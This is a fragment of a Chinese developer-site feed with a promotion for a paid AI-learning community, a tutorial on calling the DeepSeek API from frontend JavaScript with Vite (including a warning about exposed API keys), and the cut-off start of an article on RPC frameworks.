content="袁庭新"/> <meta itemprop="url" content="https://juejin.cn/user/1207714136735408"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            人人都能学AI，人人都要学AI
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1207714136735408/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    袁庭新
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T09:00:37.000Z" title="Sun Nov 23 2025 09:00:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是袁庭新。很多朋友想借助AI来赋能自己，但苦于不知从何学起，又世面上的学习资料鱼龙混杂，怕误了时间；为此呢，我专门创建了一个AI技术学习的知识星球，星球里有海量的成体系的学习资料供大家学习。</p>
<p><strong>1、星球介绍</strong></p>
<p>知识星球「人人都要学AI」是由袁庭新发起的一站式AI学习社群。涵盖文案写作、PPT制作、数据分析、思维导图、会议纪要、视频生成、生活、教育、创业、政务、法律、投研、科研、自媒体、智能体、软件开发、等50余高频工作场景，100+提示词开箱即用。社群内每月设大咖直播答疑，支持全天候互动交流，致力于为职场人、学生党、创业者等不同群体，搭建从理论认知到实践落地的全链路成长平台，助你系统掌握AI知识与技能，拥抱数字化时代的核心竞争力。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3e97d401987143fcb3681f7aeaa05ce4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KKB5bqt5paw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764493237&amp;x-signature=cQTmfuY4htKGFFMY8lDC%2Fz2wnWs%3D" alt="" loading="lazy"/></p>
<p><strong>2、星球亮点</strong></p>
<p>（1）AI行业信息：快速掌握AI领域最新动态，深度解读关键事件与行业趋势，助你始终站在技术前沿。</p>
<p>（2）AI专业知识：定期分享AI工具实操、应用教程、案例解析及开源项目，构建系统化知识体系。</p>
<p>（3）资料库共享：每周更新AI研报、政策解读、工具教材及案例资料，星友可免费下载学习。</p>
<p>（4）实战项目：提供保姆级教程、教练带队指导与社群答疑支持。</p>
<p>（5）人脉链接：联结志同道合的AI学习者，通过交流探讨实现经验共享与共同成长。</p>
<p>（6）社群陪伴：星球配有专属微信群，不定期邀请嘉宾分享，还方便寻找同频伙伴一起进步。</p>
<p>（7）专家答疑：星主与嘉宾会在社群和直播间里答疑，帮助大家解决日常工作中遇到的AI应用相关问题。</p>
<p>（8）资源对接：联通行业专家、合作伙伴与投资者，助力获取AI领域所需资源。</p>
<p>（9）副业变现：借助AI技术探索绘画、视频、数字人、智能体等变现路径，实现个人创富目标。</p>
<p>（10）社群共创：不仅有AI读报时间，学员还可以分享学习笔记、AI实操案例，探索AI变现项目，促进知识的交流与合作。</p>
<p>（11）岗位内推：为星球成员提供来自知名企业的内推机会，涵盖互联网、人工智能、科技等热门领域的招聘岗位，助力精准求职。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7136b2e4031e44dab9866bfc7ba7574e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KKB5bqt5paw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764493237&amp;x-signature=MpfHrWg3zXan07uiVQPEDPCqoeA%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[前端直连大模型：用原生 JavaScript 调用 DeepSeek API]]></title>    <link>https://juejin.cn/post/7575133880436326451</link>    <guid>https://juejin.cn/post/7575133880436326451</guid>    <pubDate>2025-11-23T08:34:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575133880436326451" data-draft-id="7575119254313861146" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="前端直连大模型：用原生 JavaScript 调用 DeepSeek API"/> <meta itemprop="keywords" content="JavaScript,DeepSeek"/> <meta itemprop="datePublished" content="2025-11-23T08:34:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Zyx2007"/> <meta itemprop="url" content="https://juejin.cn/user/3924597867554890"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            前端直连大模型：用原生 JavaScript 调用 DeepSeek API
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3924597867554890/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Zyx2007
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T08:34:10.000Z" title="Sun Nov 23 2025 08:34:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在 AI 应用快速普及的今天，大语言模型（LLM）不再只是后端服务的专属能力。通过标准的 HTTP 接口，前端应用也能直接与模型对话——无需中间服务器，只需一个 API Key 和几行代码。本文将带你从零开始，使用原生 HTML/JavaScript 搭建一个能调用 DeepSeek 大模型的前端项目，并深入解析如何安全、规范地发起复杂请求。</p>
<h2 data-id="heading-0">项目初始化：选择合适的开发脚手架</h2>
<p>虽然纯 HTML 文件足以完成基础调用，但现代前端开发更推荐使用工程化工具提升效率。Vite 是目前最轻量且功能强大的全栈脚手架之一，支持 TypeScript、环境变量、热更新等特性。</p>
<p>首先，初始化一个 Vite 项目：</p>
<pre><code class="hljs language-perl" lang="perl">npm create vite@latest <span class="hljs-keyword">my</span>-llm-app -- --template vanilla
cd <span class="hljs-keyword">my</span>-llm-app
npm install
</code></pre>
<p>这会创建一个基于原生 JavaScript 的项目结构，包含 <code>index.html</code> 和 <code>main.js</code>，非常适合快速集成 LLM 调用逻辑。</p>
<h2 data-id="heading-1">理解 LLM 的 HTTP 调用协议</h2>
<p>大模型 API 本质上是一个标准的 RESTful 服务。以 DeepSeek 为例，其聊天接口地址为：</p>
<pre><code class="hljs language-bash" lang="bash">https://api.deepseek.com/v1/chat/completions
</code></pre>
<p>调用它需要构造一个符合要求的 <strong>POST 请求</strong>，包含三个关键部分：</p>
<h3 data-id="heading-2">1. 请求行（Request Line）</h3>
<ul>
<li>方法：<code>POST</code></li>
<li>URL：完整接口地址</li>
<li>协议版本：HTTP/1.1（由浏览器自动处理）</li>
</ul>
<h3 data-id="heading-3">2. 请求头（Headers）</h3>
<p>必须包含两项：</p>
<ul>
<li><code>Content-Type: application/json</code>：声明请求体为 JSON 格式</li>
<li><code>Authorization: Bearer &lt;your-api-key&gt;</code>：身份认证令牌</li>
</ul>
<h3 data-id="heading-4">3. 请求体（Body）</h3>
<ul>
<li>必须是字符串，不能直接传 JavaScript 对象</li>
<li>需用 <code>JSON.stringify()</code> 序列化</li>
<li>包含模型名称、消息历史等参数</li>
</ul>
<h2 data-id="heading-5">前端代码实现：用 fetch 发起请求</h2>
<p>下面是在 <code>main.js</code> 中封装的调用函数：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 从环境变量读取 API Key（Vite 支持 .env 文件）</span>
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">API_KEY</span> = <span class="hljs-keyword">import</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">env</span>.<span class="hljs-property">VITE_DEEPSEEK_API_KEY</span>;
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">API_URL</span> = <span class="hljs-string">'https://api.deepseek.com/v1/chat/completions'</span>;

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">askDeepSeek</span>(<span class="hljs-params">messages</span>) {
  <span class="hljs-keyword">const</span> payload = {
    <span class="hljs-attr">model</span>: <span class="hljs-string">'deepseek-reasoner'</span>,
    <span class="hljs-attr">messages</span>: messages,
    <span class="hljs-attr">max_tokens</span>: <span class="hljs-number">500</span>
  };

  <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-variable constant_">API_URL</span>, {
    <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
    <span class="hljs-attr">headers</span>: {
      <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>,
      <span class="hljs-string">'Authorization'</span>: <span class="hljs-string">`Bearer <span class="hljs-subst">${API_KEY}</span>`</span>
    },
    <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(payload)
  });

  <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`HTTP error! status: <span class="hljs-subst">${response.status}</span>`</span>);
  }

  <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();
  <span class="hljs-keyword">return</span> data.<span class="hljs-property">choices</span>[<span class="hljs-number">0</span>].<span class="hljs-property">message</span>.<span class="hljs-property">content</span>;
}
</code></pre>
<h3 data-id="heading-6">关键点解析：</h3>
<ul>
<li>
<p><strong><code>import.meta.env</code></strong>：Vite 提供的环境变量读取方式。需在项目根目录创建 <code>.env</code> 文件：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">VITE_DEEPSEEK_API_KEY</span>=sk-xxxxxxxxxxxxxxxxxxxx
</code></pre>
<blockquote>
<p>注意：Vite 要求环境变量必须以 <code>VITE_</code> 开头才能在前端暴露，这是安全机制。</p>
</blockquote>
</li>
<li>
<p><strong><code>await fetch</code></strong>：相比 <code>.then()</code> 链式调用，<code>async/await</code> 语法更接近同步代码，逻辑清晰易读。</p>
</li>
<li>
<p><strong>错误处理</strong>：检查 <code>response.ok</code> 可捕获 4xx/5xx 错误，避免解析失败的 JSON。</p>
</li>
</ul>
<h2 data-id="heading-7">在页面中使用</h2>
<p>在 <code>index.html</code> 中添加简单交互：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>AI 助手<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"question"</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"输入问题..."</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">"handleAsk()"</span>&gt;</span>提问<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"answer"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

  <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"module"</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"/main.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
    <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">handleAsk</span>(<span class="hljs-params"/>) {
      <span class="hljs-keyword">const</span> input = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'question'</span>);
      <span class="hljs-keyword">const</span> answerDiv = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'answer'</span>);
      
      <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">askDeepSeek</span>([
          { <span class="hljs-attr">role</span>: <span class="hljs-string">'user'</span>, <span class="hljs-attr">content</span>: input.<span class="hljs-property">value</span> }
        ]);
        answerDiv.<span class="hljs-property">textContent</span> = response;
      } <span class="hljs-keyword">catch</span> (err) {
        answerDiv.<span class="hljs-property">textContent</span> = <span class="hljs-string">'请求失败：'</span> + err.<span class="hljs-property">message</span>;
      }
    }
  </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p>这里通过内联 <code>&lt;script&gt;</code> 调用模块化的 <code>askDeepSeek</code> 函数，实现了从用户输入到 AI 回答的完整流程。</p>
<h2 data-id="heading-8">安全提醒：前端暴露 API Key 的风险</h2>
<p>必须明确：<strong>将 API Key 写在前端代码中存在泄露风险</strong>。任何访问你网页的用户都能通过开发者工具查看该密钥。因此，这种方式仅适用于：</p>
<ul>
<li>个人测试项目</li>
<li>密钥有严格用量限制</li>
<li>使用了 API 平台的域名白名单或 Referer 限制</li>
</ul>
<p>对于生产环境，强烈建议通过自己的后端代理请求，由服务器保管密钥。</p>
<h2 data-id="heading-9">总结</h2>
<p>通过原生 fetch API，前端可以直接与大模型服务通信，实现低延迟的智能交互。结合 Vite 的工程化能力，我们不仅能高效开发，还能通过环境变量管理敏感信息。虽然存在安全限制，但在可控场景下，这种“前端直连 LLM”的模式极大简化了 AI 应用的构建流程——从一行 HTML 到智能对话，不过百行代码的距离。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[深入浅出谈谈RPC框架]]></title>    <link>https://juejin.cn/post/7575104251865890826</link>    <guid>https://juejin.cn/post/7575104251865890826</guid>    <pubDate>2025-11-22T16:11:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575104251865890826" data-draft-id="7575083657994223643" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深入浅出谈谈RPC框架"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-11-22T16:11:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="XUN4J"/> <meta itemprop="url" content="https://juejin.cn/user/4179664935335515"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深入浅出谈谈RPC框架
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4179664935335515/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    XUN4J
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-22T16:11:48.000Z" title="Sat Nov 22 2025 16:11:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body 